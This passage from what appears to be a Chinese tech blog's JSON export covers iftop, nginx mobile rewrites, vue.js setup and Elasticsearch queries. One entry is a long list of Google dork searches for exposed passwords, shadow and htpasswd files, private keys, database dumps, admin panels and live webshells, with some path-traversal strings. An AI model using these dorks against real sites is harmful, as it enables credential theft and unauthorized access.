打开屏幕过滤功能，输入要过滤的字符，比如 ip,按回车后，屏幕就只显示这个 IP 相关的流量信息;\n按 L 切换显示画面上边的刻度;刻度不同，流量图形条会有变化;\n按 j 或按 k 可以向上或向下滚动屏幕显示的连接记录;\n按 1 或 2 或 3 可以根据右侧显示的三列流量数据进行排序;\n按 \u003c 根据左边的本机名或 IP 排序;\n按   根据远端目标主机的主机名或 IP 排序;\n按 o 切换是否固定只显示当前的连接;\n按 f 可以编辑过滤代码，这是翻译过来的说法，我还没用过这个！\n按 ! 可以使用shell命令，这个没用过！没搞明白啥命令在这好用呢！\n按q退出监控。","tags":null},{"location":"//blog.pytool.com/Post/nginx/2016-01-01 Nginx 根据客户浏览器选择不同后端","title":"Nginx 根据访问终端跳转页面","text":"Nginx 根据访问终端跳转页面\n\nserver {\n servername g3.tm-sp.com;\n listen 80;\n accesslog off;\n location / {\n if ($httpuseragent ~ \"((MIDP)|(WAP)|(UP.Browser)|(Smartphone)|(Obigo)|(Mobile)|(AU.Browser)|(wxd.Mms)|(WxdB.Browser)|(CLDC)|(UP.Link)|(KM.Browser)|(UCWEB)|(SEMC-Browser)|(Mini)|(Symbian)|(Palm)|(Nokia)|(Panasonic)|(MOT)|(SonyEricsson)|(NEC)|(Alcatel)|(Ericsson)|(BENQ)|(BenQ)|(Amoisonic)|(Amoi)|(Capitel)|(PHILIPS)|(SAMSUNG)|(Lenovo)|(Mitsu)|(Motorola)|(SHARP)|(WAPPER)|(LG)|(EG900)|(CECT)|(Compal)|(kejian)|(Bird)|(BIRD)|(G900/V1.0)|(Arima)|(CTL)|(TDG)|(Daxian)|(DAXIAN)|(DBTEL)|(Eastcom)|(EASTCOM)|(PANTECH)|(Dopod)|(Haier)|(HAIER)|(KONKA)|(KEJIAN)|(LENOVO)|(Soutec)|(SOUTEC)|(SAGEM)|(SEC)|(SED)|(EMOL)|(INNO55)|(ZTE)|(iPhone)|(Android)|(Windows CE)|(Wget)|(Java)|(curl)|(Opera))\"){\n\trewrite ^/(.)$ http://221.180.20.228:8081/wap/$1 ;\n}\nif ( $httpuseragent ~ ^$ )  {  \n\trewrite ^/(.)$ http://221.180.20.228:8081/wap/$1 ;  \n}         \n proxypass http://221.180.20.228:8080;\n }\n}\n\n手机端重写\nlocation / {\n  index  index.htm index.html index.php;\n  if (!-e $requestfilename){\n  地址作为将参数rewrite到index.php上。tp框架接收s参数为controller和action，不少框架都利用这种方式来实现伪pathinfo模式（pathinfo为php功能，nginx并不支持）\n  rewrite ^/(.)$ /index.php?s=$1 last;\n  break;\n  }\n  # 手机端重写\n  if ($httpuseragent ~ (mobile|nokia|iphone|ipad|android|samsung|htc|blackberry)) {\n    rewrite ^/(.*)$ http://$host/mobile/$1 permanent;    #进行正常访问的时候判断user_agent为手机，则重写至此页面\n  }\n}\n\nlocation /mobile {\n  index mobile.php\n\n}\n`","tags":null},{"location":"//blog.pytool.com/Post/前端技术/vue/2016-12-08 vue.js的起步","title":"vue.js的起步","text":"介绍\n\nvue.js 是一个客户端js库，可以用来开发单页应用。为了一个项目的选型，我前前后后的看了angular、react、vuejs ，对前两者是佩服，对后者是爱。因为它简洁干净利索，并且还有高大上的web components实现。即使文档不多，我也愿意选择它。接下来，我们首先建立一个开始的项目，并且撸一遍开发过程中涉及到的概念和组件。\nvue.js\n\n稍微像样一点的vuejs的开发过程几乎总是搭配webpack、babel一起的，喜欢从头hack的人，我告诉你配置是极为繁琐的，幸好vue.js 提供了一个工具，叫做vue-cli 。可用于快速搭建单页应用起步代码。只需一分钟即可启动常用的开发特性：\n\n    可用的脚手架代码。\n\n    热重载。组件代码更新后自动重新加载\n\n    静态代码检查。\n\n    ES6语言特性\n\n工具准备\n\n我们需要使用vue-cli来创建一个脚手架项目。\n安装 vue-cli\n\n$ npm install -g vue-cli\n\n确认node版本\n\n我的版本是\n\n$ node -v\nv5.0.0\n$ npm -v\n3.10.6\n\n很多问题如果出现，可能和版本有关，建议和我一致 。\n创建新项目\n\n执行：\n\n   $ vue init webpack my-project\n\n第二个参数webpack，指明创建一个基于 \"webpack\" 模板的vuejs项目。此模板会创建一个webpack的脚手架代码。\n\n然而，webpack是啥？它本身是一个打包工具，可以把js、css、image打包成一个或者多个js文件，并且可以支持各种loader作为插件对不同类型的文件做转换处理。实际上webpack就是通过插件vue-loader在加载vue类型的文件时做格式转换，把vue类型文件翻译为浏览器可以识别的js文件。\n\n中国用户注意：vue init命令使用了npm， npm的仓库经常缓慢或者被阻断，可以使用国内镜像，只要编辑 ~/.npmrc 加入下面内容：\n\nregistry = https://registry.npm.taobao.org\n\n这个的做法可以快得多。\n\n当前可以使用的模板有：\n\nwebpack - 通过webpack和vue-loader插件，可以调用babel把.vue文件编译为客户端可以识别的js文件。默认还可以提供热加载、代码检查、测试。\nwebpack-simple - 最简单的webpack和vue-loader插件。\nbrowserify - 通过Browserify + vueify 的组合，可以调用babel把.vue文件编译为客户端可以识别的js文件。默认还可以提供热加载、代码检查、测试。\nbrowserify-simple - 最简单的Browserify + vueify 插件。\n\n理论上webpack和browserify的功能类似，都可以做打包工具。但是webpack就是那个文档特少，但是大家都争着使用的热门工具。所以，我们就不管那么多，先使用webpack啦。\n安装依赖，走你\n\n$ cd my-project\n$ npm install\n$ npm run dev\n\n到http://localhost:8080查看效果。\n查看vue文件\n\nvue文件是三位一体的。就是说css、html、js都在一个文件内，使用标签做出分割。为了更好的查看结构，建议首先安装对应编辑器的高光插件。\n安装语法高光\n\n我习惯使用的编辑器是sublime text，安装插件就可以识别所有扩展名为.vue的vuejs组件代码，给予高光显示，便于代码的阅读和编写。这个插件叫做 vue-syntax-highlight，是vuejs官方提供的。它位于github.com。只要把它克隆到你的Sublime包目录内。在我的电脑上，Sublime包目录是/Users/lcj/Library/Application Support/Sublime Text 3/Packages ，所以安装的过程就是\n\ncd /Users/lcj/Library/Application\\ Support/Sublime\\ Text\\ 3/Packages\ngit clone https://github.com/vuejs/vue-syntax-highlight\n\n然后重新启动即可。之后阅读代码，所有的扩展名为.vue文件都会有相应的高光显示。\n查看vue\n\n起步代码中有一个组件代码，在src/hello.vue内。查看：\n\n template\n    div class=\"hello\"\n      h1{{ msg }}/h1\n    /div\n  /template\n\n  script\n  export default {\n    data () {\n      return {\n        msg: 'Hello World!'\n      }\n    }\n  }\n  /script\n\n  style scoped\n  h1 {\n    color: #42b983;\n  }\n  /style\n\n文件内分为三个部分， template标签包围内的是html代码； script内包围的是js代码，并且可以使用ES6的语法。 style内的则是css代码。使用这个组件的代码在app.vue内。只要首先在脚本内声明标签\n\nimport Hello from './components/Hello'\nexport default {\n  components: {\n    Hello\n  }\n}\n\n随后在html内使用标签即可\n\nhello/hello\n\n非常大的一个亮点！一个vue文件，内部js、css、html就都齐了，可以作为一个完整的、自包含的组件了。非常有趣的、我个人极为欣赏的web components就在此处了。\n\nvue文件内的语法，当然不是浏览器所可以支持的，浏览器不认识它！魔术在于webpack+vue-loader+babel 。webpack加载vue文件首先调用vue-loader，vue-loader会调用babel转换ES6代码为ES5代码，把css和html作为模块也转换为客户端js代码。这些js代码浏览器就可以识别了。\n\n另外，我们看看热加载。把hello组件的msg值改改。然后保存。浏览器会自动刷新的。这就是热加载了。对于频繁修改调试的程序员，有了热加载，得轻松不少。\n安装chrome开发工具\n\n我习惯使用的浏览器是chrome，可以安装vue的开发工具到chrome插件内。在chrome市场内查询vue-developertools 。有了它，可以在chrome console内看到更加友好的vue错误提示。\n回归日常\n\n我们所有的编辑修改一旦完成需要更新网站时，最终需要把所有的vue，ES6代码等编译出来到ES5的js文件。现在可以构建这些webpack代码：\n\nnpm run build\n\n此命令会把我们已经有的开发成果，编译到dist目录下，就是说编译成前端可以直接使用的html、js、css。\n\n有了它们，我就可以使用一个http 静态服务器，在dist目录内执行：\n\ncd dist\nnpm install http-server -g\nhttp-server\n\n然后，到http://localhost:8080查看效果。和运行npm run dev看到的一模一样。\n更多\n\nvue还有两个插件，对开发者很有价值\n加强版 ，访问服务器\n\nnpm install vue-resource --save\n\n安装路由\n\nnpm install vue-router --save\n\n细节展开\n\n我们走马观花的看了webpack、vue-loader、babel 、vue组件，未来需要一些篇幅去详细说明它们。\n关于\n\n作者：刘传君\n\n创建过产品，创过业。不好动，读书机器。可以通过 1000copy#gmail.com 联系到我\n出品\n\nhttp小书 http://www.ituring.com.cn/boo...\nGit小书 http://www.ituring.com.cn/boo...","tags":null},{"location":"//blog.pytool.com/Hacker/2016-10-22 Google Hack的一些整理","title":"Google Hack的一些整理","text":"Google Hack的一些整理\n1.在githuh上查找 local.properties 文件\ninurl:local filetype:properties site:github.com\ndrone filetype:yml site:github.com\n这里是一些关于Google Hack方面的整理\n\n破解 序列号 Crack Keygen/Serial\n\nGoogle搜索技巧挑战隐私(Google hacker)\n\n黑客专用信息和资料搜索地址为：\nhttp://www.google.com/custom?hl=xx-hacker\n这里是google关键字的用法，要设置它为中文，则是\nhttp://www.google.com/custom?hl=zh-CN\n英文则是http://www.google.com/custom?hl=en\n\n常用的google关键字：\nfoo1 foo2 (也就是关联，比如搜索xx公司 xx美女)\noperator:foo\nfiletype:123 类型\nsite:foo.com 相对直接看网站更有意思，可以得到许多意外的信息\nintext:foo\nintitle: fooltitle 标题哦\nallinurl:foo 搜索xx网站的所有相关连接。（踩点必备）\nlinks:foo 不要说就知道是它的相关链接\nallintilte:foo.com\n\n我们可以辅助\"-\" \"+\"来调整搜索的精确程度\n\n直接搜索密码：(引号表示为精确搜索)\n当然我们可以再延伸到上面的结果里进行二次搜索\n\"index of\" htpasswd / passwd\nfiletype:xls username password email\n\"wsftp.log\"\n\"config.php\"\nallinurl:admin mdb\nservice filetype:pwd ….或者某个比如pcanywhere的密码后缀cif等\n\n越来越有意思了，再来点更敏感信息\n\"robots.txt\" \"Disallow:\" filetype:txt\ninurl:vticnf (FrontPage的关键索引啦，扫描器的CGI库一般都有地)\nallinurl: /msadc/Samples/selector/showcode.asp\n/../../../passwd\n/examples/jsp/snp/snoop.jsp\nphpsysinfo\nintitle:index of /admin\nintitle:\"documetation\"\ninurl: 5800(vnc的端口)或者desktop port等多个关键字检索\nwebmin port 10000\ninurl:/admin/login.asp\nintext:Powered by GBook365\nintitle:\"php shell\" \"Enable stderr\" filetype:php 直接搜索到phpwebshell\n\nfoo.org filetype:inc\n\nipsec filetype:conf\nintilte:\"error occurred\" ODBC request WHERE (select|insert) 说白了就是说，可以直接试着查查数据库检索，针对目前流行的sql注射，会发达哦\nintitle:\"php shell\" \"Enable stderr\" filetype:php\n\"Dumping data for table\" username password\nintitle:\"Error using Hypernews\"\n\"Server Software\"\nintitle:\"HTTPUSERAGENT=Googlebot\"\n\"HTTPUSERANGET=Googlebot\" THS ADMIN\nfiletype:.doc site:.mil classified 直接搜索军方相关word\n\n检查多个关键字：\nintitle:config confixx login password\n\n\"mydomain.com\" nessus report\n\"report generated by\"\n\"ipconfig\"\n\"winipconfig\"\n\ngoogle缓存利用（hoho，最有影响力的东西）推荐大家搜索时候多\"选搜索所有网站\"\n特别推荐：administrator users 等相关的东西，比如名字，生日等……最惨也可以拿来做字典嘛\ncache:foo.com\n\n可以查阅类似结果\n\n先找找网站的管理后台地址：\nsite:xxxx.com intext:管理\nsite:xxxx.com inurl:login\nsite:xxxx.com intitle:管理\nsite:a2.xxxx.com inurl:file\nsite:a3.xxxx.com inurl:load\nsite:a2.xxxx.com intext:ftp://:\nsite:a2.xxxx.com filetype:asp\nsite:xxxx.com //得到N个二级域名\nsite:xxxx.com intext:@xxxx.com //得到N个邮件地址，还有邮箱的主人的名字什么的\nsite:xxxx.com intext:电话 //N个电话\nintitle:\"index of\" etc\nintitle:\"Index of\" .shhistory\nintitle:\"Index of\" .bashhistory\nintitle:\"index of\" passwd\nintitle:\"index of\" people.lst\nintitle:\"index of\" pwd.db\nintitle:\"index of\" etc/shadow\nintitle:\"index of\" spwd\nintitle:\"index of\" master.passwd\nintitle:\"index of\" htpasswd\n\" -FrontPage-\" inurl:service.pwd\n\nallinurl:bbs data\nfiletype:mdb inurl:database\nfiletype:inc conn\ninurl:data filetype:mdb\nintitle:\"index of\" data\n……\n\n一些技巧集合：\n\n3) \"http://:@www\" domainname 找一些ISP站点，可以查对方ip的虚拟主机\n3\n4) authuserfile.txt 不实用了，太老了\n\n5) The Master List 寻找邮件列表的\n\n6) intitle:\"welcome.to.squeezebox\" 一种特殊的管理系统，默认开放端口90\n7) passlist.txt (a better way) 字典\n\n8) \"A syntax error has occurred\" filetype:ihtml\n\n9) ext:php programlisting intitle:MythWeb.Program.Listing\n10) intitle:index.of abyss.conf\n11)ext:nbe nbe\n\n12)intitle:\"SWW link\" \"Please wait…..\"\n13)\n\n14) intitle:\"Freifunk.Net – Status\" -site:commando.de\n\n15) intitle:\"WorldClient\" intext:\"? (2003|2004) Alt-N Technologies.\"\n\n17) intitle:open-xchange inurl:login.pl\n\n20) intitle:\"site administration: please log in\" \"site designed by emarketsouth\"\n21) ORA-00921: unexpected end of SQL command\n\n22)intitle:\"YALA: Yet Another LDAP Administrator\"\n23)welcome.to phpqladmin \"Please login\" -cvsweb\n24)intitle:\"SWW link\" \"Please wait…..\"\n25)inurl:\"port255\" -htm\n\n27)intitle:\"WorldClient\" intext:\"? (2003|2004) Alt-N Technologies.\"\n\n这些是新的一些漏洞技巧，在0days公告公布\n\next:php programlisting intitle:MythWeb.Program.Listing\n\ninurl:preferences.ini \"[emule]\"\n\nintitle:\"Index of /CFIDE/\" administrator\n\n\"access denied for user\" \"using password\"\n\next:php intext:\"Powered by phpNewMan Version\" 可以看到：path/to/news/browse.php?clang=../../../../../../file/i/want\n\ninurl:\"/becommunity/community/index.php?pageurl=\"\n\nintitle:\"ASP FileMan\" Resend -site:iisworks.com\n\n\"Enter ip\" inurl:\"php-ping.php\"\n\next:conf inurl:rsyncd.conf -cvs -man\n\nintitle: private, protected, secret, secure, winnt\n\nintitle:\"DocuShare\" inurl:\"docushare/dsweb/\" -faq -gov -edu\n\"#mysql dump\" filetype:sql\n\n\"allowcalltimepassreference\" \"PATHINFO\"\n\n\"Certificate Practice Statement\" inurl:(PDF | DOC)\n\nLeapFTP intitle:\"index.of./\" sites.ini modified\nmaster.passwd\n\nmysql history files\nNickServ registration passwords\npasslist\npasslist.txt (a better way)\npasswd\npasswd / etc (reliable)\npeople.lst\npsyBNC config files\npwd.db\nsignin filetype:url\nspwd.db / passwd\ntrillian.ini\nwwwboard WebAdmin inurl:passwd.txt wwwboard|webadmin\n\n\"# -FrontPage-\" ext:pwd inurl:(service | authors | administrators | users) \"# -FrontPage-\"\n\ninurl:service.pwd\n\"AutoCreate=TRUE password=\"\n\"http://:@www\" domainname\n\"index of/\" \"wsftp.ini\" \"parent directory\"\n\"liveice configuration file\" ext:cfg -site:sourceforge.net\n\"powered by ducalendar\" -site:duware.com\n\"Powered by Duclassified\" -site:duware.com\n\"Powered by Duclassified\" -site:duware.com \"DUware All Rights reserved\"\n\"powered by duclassmate\" -site:duware.com\n\"Powered by Dudirectory\" -site:duware.com\n\"powered by dudownload\" -site:duware.com\n\"Powered By Elite Forum Version .\"\n\"Powered by Link Department\"\n\"sets mode: +k\"\n\"Powered by DUpaypal\" -site:duware.com\nallinurl: admin mdb\nauthuserfile.txt\nconfig.php\neggdrop filetype:user user\netc (index.of)\next:ini eudora.ini\next:ini Version=… password\next:txt inurl:unattend.txt\n\nfiletype:bak inurl:\"htaccess|passwd|shadow|htusers\"\n\nfiletype:cfg mrtg \"target\n\n    \" -sample -cvs -example\n\nfiletype:cfm \"cfapplication name\" password\n\nfiletype:conf oekakibbs\nfiletype:conf scserv.conf\n\nfiletype:conf slapd.conf\n\nfiletype:config config intext:appSettings \"User ID\"\n\nfiletype:dat \"password.dat\"\n\nfiletype:dat wand.dat\n\nfiletype:inc dbconn\n\nfiletype:inc intext:mysqlconnect\nfiletype:inc mysqlconnect OR mysqlpconnect\n\nfiletype:inf sysprep\n\nfiletype:ini inurl:\"serv-u.ini\"\nfiletype:ini inurl:flashFXP.ini\nfiletype:ini ServUDaemon\nfiletype:ini wcxftp\nfiletype:ini wsftp pwd\n\nfiletype:ldb admin\n\nfiletype:log \"See `ipsec copyright\"\n\nfiletype:log inurl:\"password.log\"\n\nfiletype:mdb inurl:users.mdb\n\nfiletype:mdb wwforum\n\nfiletype:netrc password\n\nfiletype:pass pass intext:userid\n\nfiletype:pem intext:private\n\nfiletype:properties inurl:db intext:password\n\nfiletype:pwd service\nfiletype:pwl pwl\n\nfiletype:reg reg +intext:\"defaultusername\" +intext:\"defaultpassword\"\nfiletype:reg reg HKEYCURRENTUSER SSHHOSTKEYS\nfiletype:sql (\"values  MD\" | \"values  password\" | \"values  encrypt\")\nfiletype:sql (\"passwd values\" | \"password values\" | \"pass values\" )\nfiletype:sql +\"IDENTIFIED BY\" -cvs\nfiletype:sql password\n\nfiletype:url +inurl:\"ftp://\" +inurl:\";@\"\n\nfiletype:xls username password email\n\nhtpasswd\nhtpasswd / htgroup\nhtpasswd / htpasswd.bak\n\nintext:\"enable secret $\"\nintext:\"powered by Web Wiz Journal\"\n\nintitle:\"index of\" intext:connect.inc\nintitle:\"index of\" intext:globals.inc\nintitle:\"Index of\" passwords modified\n\nintitle:dupics inurl:(add.asp | default.asp | view.asp | voting.asp) -site:duware.com\n———————————————————————————————————————-\n\nintitle:index.of intext:\"secring.skr\"|\"secring.pgp\"|\"secring.bak\"\n\ninurl:\"GRC.DAT\" intext:\"password\"\n\ninurl:\"slapd.conf\" intext:\"credentials\" -manpage -\"Manual Page\" -man: -sample\n\ninurl:\"slapd.conf\" intext:\"rootpw\" -manpage -\"Manual Page\" -man: -sample\n\ninurl:\"wvdial.conf\" intext:\"password\"\n\ninurl:/db/main.mdb\n\ninurl:chap-secrets -cvs\n\ninurl:config.php dbuname dbpass\ninurl:filezilla.xml -cvs\n\ninurl:lilo.conf filetype:conf password -tatercounter -bootpwd -man\n\ninurl:nuke filetype:sql\n\ninurl:ospfd.conf intext:password -sample -test -tutorial -download 路由配置\ninurl:pap-secrets -cvs\n\ninurl:perform filetype:ini\ninurl:secring ext:skr | ext:pgp | ext:bak\n\ninurl:vtund.conf intext:pass -cvs\n\ninurl:zebra.conf intext:password -sample -test -tutorial -download\n\n\"Generated by phpSystem\"\n\"generated by wwwstat\"\n\n\"Host Vulnerability Summary Report\" ]\n\n\"HTTPFROM=googlebot\" googlebot.com \"ServerSoftware=\"\n\n\"Index of\" / \"chat/logs\" 聊天室\n\"Installed Objects Scanner\" inurl:default.asp\n\n\"Mecury Version\" \"Infastructure Group\"\n\"Microsoft (R) Windows  (TM) Version  DrWtsn Copyright (C)\" ext:log\n\n\"Most Submitted Forms and Scripts\" \"this section\"\n\n\"Network Vulnerability Assessment Report\"\n\n\"not for distribution\" confidential\n\"phone   \" \"address \" \"e-mail\" intitle:\"curriculum vitae\"\n\n\"phpMyAdmin\" \"running on\" inurl:\"main.php\"\n\n\"produced by getstats\"\n\"Request Details\" \"Control Tree\" \"Server Variables\"\n\"robots.txt\" \"Disallow:\" filetype:txt\n\n\"Running in Child mode\"\n\n\"sets mode: +p\"\n\"sets mode: +s\"\n\"Thank you for your order\" +receipt\n\"This is a Shareaza Node\"\n\"This report was generated by WebLog\"\n( filetype:mail | filetype:eml | filetype:mbox | filetype:mbx ) intext:password|subject\n\n(inurl:\"robot.txt\" | inurl:\"robots.txt\" ) intext:disallow filetype:txt\n\n-site:php.net -\"The PHP Group\" inurl:source inurl:url ext:pHp\n\nFBR \"ADOBE PHOTOSHOP\"\nAIM buddy lists\nallinurl:/examples/jsp/snp/snoop.jsp\nallinurl:servlet/SnoopServlet\ncgiirc.conf\n\ndata filetype:mdb -site:gov -site:mil\n\nexported email addresses\n\next:asp inurl:pathto.asp\n\next:cgi inurl:editcgi.cgi inurl:file=\n\next:conf inurl:rsyncd.conf -cvs -man\next:conf NoCatAuth -cvs\n\next:dat bpk.dat\next:gho gho\n\next:ini intext:env.ini\next:ldif ldif\n\next:log \"Software: Microsoft Internet Information Services .\"\n——————————————————————————————\next:mdb inurl:.mdb inurl:fpdb shop.mdb\n\nfiletype:bkf bkf\nfiletype:blt \"buddylist\"\nfiletype:blt blt +intext:screenname\n\nfiletype:cfg autoinst.cfg\n\nfiletype:conf inurl:firewall -intitle:cvs\nfiletype:config web.config -CVS\n\nfiletype:ctt ctt messenger\n\nfiletype:fp fp\nfiletype:fp fp -site:gov -site:mil -\"cvs log\"\n\nfiletype:inf inurl:capolicy.inf\nfiletype:lic lic intext:key\n\nfiletype:myd myd -CVS\nfiletype:ns ns\nfiletype:ora ora\nfiletype:ora tnsnames\nfiletype:pdb pdb backup (Pilot | Pluckerdb)\n\nfiletype:pot inurl:john.pot\n——————————————————————————————————————\nfiletype:pst inurl:\"outlook.pst\"\nfiletype:pst pst -from -to -date\nfiletype:qbb qbb\nfiletype:rdp rdp\n\nfiletype:reg \"Terminal Server Client\"\nfiletype:vcs vcs\nfiletype:wab wab\n\nfiletype:xls -site:gov inurl:contact\nfiletype:xls inurl:\"email.xls\"\nFinancial spreadsheets: finance.xls\nFinancial spreadsheets: finances.xls\n\nGanglia Cluster Reports\n\nhaccess.ctl (one way)\nhaccess.ctl (VERY reliable)\nICQ chat logs, please…\n\niletype:log cron.log\nintext:\"Session Start    :: \" filetype:log\nintext:\"Tobias Oetiker\" \"traffic analysis\"\n\nintext:(password | passcode) intext:(username | userid | user) filetype:csv\nintext:gmail invite intext:http://gmail.google.com/gmail/a\n\nintext:SQLiteManager inurl:main.php\n\nintitle:\"Apache::Status\" (inurl:server-status | inurl:status.html | inurl:apache.html)\n\nintitle:\"AppServ Open Project\" -site:www.appservnetwork.com\nintitle:\"ASP Stats Generator .\" \"ASP Stats Generator\" \"- weppos\"\n\nintitle:\"FTP root at\"\nintitle:\"index of\" +myd size\n\nintitle:\"Index Of\" -inurl:maillog maillog size\n\nintitle:\"Index Of\" cookies.txt size\n\nintitle:\"index of\" mysql.conf OR mysqlconfig\nintitle:\"Index of\" upload size parent directory\n\nintitle:\"index.of\" .diz .nfo last modified\nintitle:\"Multimon UPS status page\"\nintitle:\"PHP Advanced Transfer\" (inurl:index.php | inurl:showrecent.php )\nintitle:\"PhpMyExplorer\" inurl:\"index.php\" -cvs\n———————————————————————\nintitle:\"statistics of\" \"advanced web statistics\"\nintitle:\"System Statistics\" +\"System and Network Information Center\"\nintitle:\"Usage Statistics for\" \"Generated by Webalizer\"\nintitle:\"wbem\" compaq login \"Compaq Information Technologies Group\"\n\nintitle:\"Web Server Statistics for **\"\nintitle:\"web server status\" SSH Telnet\nintitle:\"welcome.to.squeezebox\"\n\nintitle:admin intitle:login\nintitle:index.of \"Apache\" \"server at\"\nintitle:index.of cleanup.log\nintitle:index.of dead.letter\nintitle:index.of inbox\nintitle:index.of inbox dbx\n\nintitle:intranet inurl:intranet +intext:\"phone\"\ninurl:\"/axs/ax-admin.pl\" -script\ninurl:\"/cricket/grapher.cgi\"\ninurl:\"bookmark.htm\"\n\ninurl:\"cacti\" +inurl:\"graphview.php\" +\"Settings Tree View\" -cvs -RPM\ninurl:\"newsletter/admin/\"\ninurl:\"newsletter/admin/\" intitle:\"newsletter admin\"\ninurl:\"putty.reg\"\ninurl:\"smb.conf\" intext:\"workgroup\" filetype:conf conf\n———————————————————————————————————-\n\nWelcome to ntop!\n\n\"adding new user\" inurl:addnewuser -\"there are no domains\"\n(inurl:/cgi-bin/.cobalt/) | (intext:\"Welcome to the Cobalt RaQ\")\n\nfiletype:php HAXPLORER \"Server Files Browser\"\nintitle:\"Web Data Administrator – Login\"\n\ninurl:ConnectComputer/precheck.htm | inurl:Remote/logon.aspx\nPHP Shell (unprotected)\nPHPKonsole PHPShell filetype:php -echo\nPublic PHP FileManagers\n\n\"index of\" / picasa.ini\n\"index of\" inurl:recycler\n\"Index of\" rar r nfo Modified\n\"intitle:Index.Of /\" stats merchant cgi- etc\n\"Powered by Invision Power File Manager\" (inurl:login.php) | (intitle:\"Browsing directory /\" )\n\"Web File Browser\" \"Use regular expression\"\n\nfiletype:ini Desktop.ini intext:mydocs.dll\n\nintext:\"d.aspx?id\" || inurl:\"d.aspx?id\"\nintext:\"Powered By: TotalIndex\" intitle:\"TotalIndex\"\nintitle:\"album permissions\" \"Users who can modify photos\" \"EVERYBODY\"\nintitle:\"Directory Listing For\" intext:Tomcat -intitle:Tomcat\nintitle:\"HFS /\" +\"HttpFileServer\"\nintitle:\"Index of *\" inurl:\"my shared folder\" size modified\n——————————————————————————————————————-\n\n\"File Upload Manager v.\" \"rename to\"\n\next:asp \"powered by DUForum\" inurl:(messages|details|login|default|register) -site:duware.com\next:asp inurl:DUgallery intitle:\".\" -site:dugallery.com -site:duware.com\next:cgi inurl:ubbtest\n\nezBOO \"Administrator Panel\" -cvs\n\nfiletype:cgi inurl:cachemgr.cgi\nfiletype:cnf my.cnf -cvs -example\nfiletype:inc inc intext:setcookie\n\nfiletype:php inurl:\"viewfile\" -\"index.php\" -\"idfil\nfiletype:wsdl wsdl\n\nintitle:\"ASP FileMan\" Resend -site:iisworks.com\n\nintitle:\"Index of /\" modified php.exe\n\nintitle:\"phpremoteview\" filetype:php \"Name, Size, Type, Modify\"\n\ninurl:\" WWWADMIN.PL\" intitle:\"wwwadmin\"\ninurl:\"nph-proxy.cgi\" \"Start browsing through this CGI-based proxy\"\ninurl:\"plog/register.php\"\ninurl:cgi.asx?StoreID\n\ninurl:robpoll.cgi filetype:cgi\n\nThe Master List\n\n\"More Info about MetaCart Free\"","tags":null},{"location":"//blog.pytool.com/Post/Elastic/ElasticSearch/2016-10-04 [Elasticsearch] 常用查询和操作总结","title":"Elasticsearch学习笔记(四)Mapping映射","text":"取得某个索引中某个字段中的所有出现过的值\n\n这种操作类似于使用SQL的SELECT UNIQUE语句。当需要获取某个字段上的所有可用值时，可以使用terms聚合查询完成：\nGET /indexstreets/search?searchtype=count\n{\n \"aggs\": {\n   \"streetvalues\": {\n     \"terms\": {\n       \"field\": \"name.raw\",\n       \"size\": 0\n     }\n   }\n }\n}\n\n因为目标是得到name字段上的所有出现过的值，因此searchtype被设置为了count，这样在返回的响应中不会出现冗长的hits部分。另外，查询的目标字段的索引类型需要设置为notanalyzed。所以上面的field指定的是name.raw。\n\n得到的响应如下所示：\n{\n   \"took\": 23,\n   \"timedout\": false,\n   \"shards\": {\n      \"total\": 5,\n      \"successful\": 5,\n      \"failed\": 0\n   },\n   \"hits\": {\n      \"total\": 7445,\n      \"maxscore\": 0,\n      \"hits\": []\n   },\n   \"aggregations\": {\n      \"streetvalues\": {\n         \"doccounterrorupperbound\": 0,\n         \"sumotherdoccount\": 0,\n         \"buckets\": [\n            {\n               \"key\": \"江苏路\",\n               \"doccount\": 29\n            },\n            {\n               \"key\": \"南京东路\",\n               \"doccount\": 28\n            },\n         ...\n      ...\n   ...\n\n取得某个索引/类型下某个字段中出现的不同值的个数\n\n这种操作类似于使用SQL的select count(  ) from (select distinct  from table)语句。当需要获取某个字段上的出现的不同值的个数时，可以使用cardinality聚合查询完成：\nGET /indexstreets/search?searchtype=count\n{\n  \"aggs\": {\n    \"uniqstreets\": {\n      \"cardinality\": {\n        \"field\": \"name.raw\"\n      }\n    }\n  }\n}\n\n因为目标是得到name字段上的所有出现过的值，因此searchtype被设置为了count，这样在返回的响应中不会出现冗长的hits部分。另外，查询的目标字段如果是字符串类型的，那么其索引类型需要设置为notanalyzed。所以上面的field指定的是name.raw。\n\n得到的响应如下所示：\n{\n   \"took\": 96,\n   \"timedout\": false,\n   \"shards\": {\n      \"total\": 1,\n      \"successful\": 1,\n      \"failed\": 0\n   },\n   \"hits\": {\n      \"total\": 4136543,\n      \"maxscore\": 0,\n      \"hits\": []\n   },\n   \"aggregations\": {\n      \"uniq_streets\": {\n         \"value\": 1951\n      }\n   }\n}\n\n返回结果表示该字段出现过1951个不同的字符串。","tags":null},{"location":"//blog.pytool.com/Post/Elastic/ElasticSearch/2016-10-04  Elasticsearch —— bulk批量导入数据","title":"Elasticsearch bulk批量导入数据","text":"在使用Elasticsearch的时候，一定会遇到这种场景——希望批量的导入数据，而不是一条一条的手动导入。那么此时，就一定会需要bulk命令！\n    更多内容参考我整理的Elk教程\n\nbulk批量导入\n\n批量导入可以合并多个操作，比如index,delete,update,create等等。也可以帮助从一个索引导入到另一个索引。\n\n语法大致如下；\n\nactionandmetadata\\n\noptionalsource\\n\nactionandmetadata\\n\noptionalsource\\n\n....\nactionandmetadata\\n\noptionalsource\\n\n\n需要注意的是，每一条数据都由两行构成（delete除外），其他的命令比如index和create都是由元信息行和数据行组成，update比较特殊它的数据行可能是doc也可能是upsert或者script,如果不了解的朋友可以参考前面的update的翻译。\n\n注意，每一行都是通过\\n回车符来判断结束，因此如果你自己定义了json，千万不要使用回车符。不然bulk命令会报错的！\n一个小例子\n\n比如我们现在有这样一个文件，data.json：\n{ \"index\" : { \"index\" : \"test\", \"type\" : \"type1\", \"id\" : \"1\" } }\n{ \"field1\" : \"value1\" }\n它的第一行定义了index，type，id等信息；第二行定义了字段的信息。\n\n然后执行命令：\n\ncurl -XPOST 120.92.36.21:9200/bulk --data-binary @data.json\n\n就可以看到已经导入进去数据了。\n\n对于其他的index,delete,create,update等操作也可以参考下面的格式：\n{ \"index\" : { \"index\" : \"test\", \"type\" : \"type1\", \"id\" : \"1\" } }\n{ \"field1\" : \"value1\" }\n{ \"delete\" : { \"index\" : \"test\", \"type\" : \"type1\", \"id\" : \"2\" } }\n{ \"create\" : { \"index\" : \"test\", \"type\" : \"type1\", \"id\" : \"3\" } }\n{ \"field1\" : \"value3\" }\n{ \"update\" : {\"id\" : \"1\", \"type\" : \"type1\", \"index\" : \"index1\"} }\n{ \"doc\" : 